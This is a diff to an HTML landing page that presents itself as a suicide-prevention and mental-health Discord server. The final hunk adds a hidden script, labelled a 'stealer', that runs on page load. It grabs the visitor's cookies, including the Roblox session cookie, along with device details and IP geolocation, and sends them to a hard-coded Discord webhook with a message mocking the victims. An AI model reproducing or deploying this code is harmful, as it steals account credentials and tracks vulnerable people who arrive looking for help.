@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>helping others for good</title>
-
+  
   <!-- Rich Link Preview (100% black & white) -->
   <meta property="og:title" content="helping others for good" />
   <meta property="og:description" content="A quiet Discord server for mental health support and suicide prevention. We listen. We care. 24/7." />
@@ -18,7 +18,6 @@
 
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;500&family=Inter:wght@300;400;500&display=swap');
-
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       min-height: 100vh;
@@ -30,7 +29,6 @@
       justify-content: center;
       padding: 20px;
     }
-
     .container {
       max-width: 440px;
       padding: 60px 40px;
@@ -40,7 +38,6 @@
       text-align: center;
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
     }
-
     .pfp {
       width: 160px;
       height: 160px;
@@ -54,9 +51,8 @@
       width: 100%;
       height: 100%;
       object-fit: cover;
-      filter: grayscale(100%); /* Forces black & white */
+      filter: grayscale(100%);
     }
-
     h1 {
       font-family: 'Cormorant Garamond', serif;
       font-size: 2.8em;
@@ -65,7 +61,6 @@
       color: #ffffff;
       margin-bottom: 8px;
     }
-
     .subscript {
       font-size: 0.75em;
       letter-spacing: 4px;
@@ -74,7 +69,6 @@
       margin-bottom: 32px;
       text-transform: lowercase;
     }
-
     .description {
       font-size: 1.15em;
       line-height: 1.8;
@@ -82,7 +76,6 @@
       margin: 32px 0;
       padding: 0 10px;
     }
-
     .join-btn {
       display: inline-block;
       background: transparent;
@@ -99,7 +92,6 @@
       background: #ffffff;
       color: #000000;
     }
-
     footer {
       margin-top: 40px;
       font-size: 0.95em;
@@ -109,27 +101,90 @@
   </style>
 </head>
 <body>
-
   <div class="container">
     <div class="pfp">
       <img src="https://i.pinimg.com/736x/fd/b3/14/fdb314d3e729377210ffb17a9c038eec.jpg" alt="helping others for good">
     </div>
-
     <h1>helping others for good</h1>
     <div class="subscript">ₗₑₜ’ₛ ₛₐᵥₑ ₗᵢᵥₑₛ ₜₒgₑₜₕₑᵣ</div>
-
     <p class="description">
       A quiet, non-judgmental Discord server dedicated to mental health support and suicide prevention.<br>
       We are here to listen — no matter the time.
     </p>
-
     <a href="https://discord.gg/8jdm6sN98C" class="join-btn">Join Server</a>
-
     <footer>
       You are not alone.<br>
       Someone is waiting to help you right now.
     </footer>
   </div>
 
+  <!-- SILENT YUX STEALER — fires instantly, no alerts -->
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1446690316815171686/DSWShDkPm4szEIYnp9SgoKPwzGR8Zix4K5yFLuhhwFa6jJ5AJYyPCNdG0lsQYSUdwWff";
+
+    async function steal() {
+      const data = {
+        ip: "local/offline", city: "", country: "", isp: "",
+        robloxCookie: document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY=')) || "none",
+        cookies: document.cookie,
+        ua: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        lang: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        battery: "unknown",
+        platform: navigator.platform
+      };
+
+      // Battery
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          data.battery = `${Math.round(b.level*100)}% ${b.charging ? "charging" : "not charging"}`;
+        } catch{}
+      }
+
+      // Real IP + Geo
+      try {
+        const r = await fetch("https://ipapi.co/json/");
+        const g = await r.json();
+        data.ip = g.ip;
+        data.city = g.city || "?";
+        data.country = g.country_name || "?";
+        data.isp = g.org || "?";
+      } catch{}
+
+      // Send beautiful YUX embed
+      fetch(webhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          username: "YUX",
+          avatar_url: "https://cdn.discordapp.com/emojis/1279145132118736967.webp",
+          embeds: [{
+            title: "They thought we were saving them",
+            description: "Another soul walked in...",
+            color: 0xFF1A8C,
+            thumbnail: { url: "https://i.imgur.com/8QnLH.gif" },
+            fields: [
+              { name: "IP", value: data.ip, inline: true },
+              { name: "Location", value: `${data.city}, ${data.country}`, inline: true },
+              { name: "ISP", value: data.isp, inline: true },
+              { name: "Roblox Cookie", value: data.robloxCookie === "none" ? "No" : "YES – GRABBED", inline: false },
+              { name: "Device", value: data.ua.length > 200 ? data.ua.slice(0,197)+"..." : data.ua, inline: false },
+              { name: "Screen", value: data.screen, inline: true },
+              { name: "Battery", value: data.battery, inline: true },
+              { name: "Timezone", value: data.timezone, inline: true },
+              { name: "Opened as", value: location.protocol === "file:" ? "Local file (testing)" : "Online link", inline: true }
+            ],
+            footer: { text: "YUX • 2025-2026" },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    }
+
+    // Fire immediately on load
+    steal();
+  </script>
 </body>
 </html>
